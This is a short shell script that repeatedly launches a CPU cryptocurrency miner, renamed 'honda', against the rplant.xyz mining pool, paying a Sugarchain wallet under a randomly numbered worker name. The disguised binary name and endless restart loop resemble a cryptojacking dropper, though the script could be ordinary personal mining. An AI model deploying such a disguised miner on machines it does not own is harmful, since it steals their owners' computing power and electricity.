#!/bin/sh
#
while [ 1 ]; do
./honda -a yescryptR8G -o stratum+tcps://stratum-eu.rplant.xyz:13032 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.$(echo $(shuf -i 1-500 -n 1)-bool) -t4
sleep 5
done
